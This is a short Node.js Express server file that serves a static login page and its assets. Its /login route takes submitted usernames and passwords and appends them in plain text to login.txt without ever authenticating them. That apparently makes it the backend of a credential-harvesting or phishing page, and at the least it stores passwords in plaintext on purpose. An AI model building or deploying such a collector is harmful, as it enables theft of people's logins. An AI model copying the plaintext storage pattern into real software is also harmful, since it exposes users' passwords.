const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/script.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'script.js'));
});

app.get('/style.css', (req, res) => {
    res.sendFile(path.join(__dirname, 'style.css'));
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const loginData = `Username: ${username}, Password: ${password}\n`;

    fs.appendFile('login.txt', loginData, (err) => {
        if (err) {
            console.error(err);
            return res.status(500).json({ message: 'Failed to save login data' });
        }
        res.status(200).json({ message: 'Login data saved successfully' });
    });
});

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
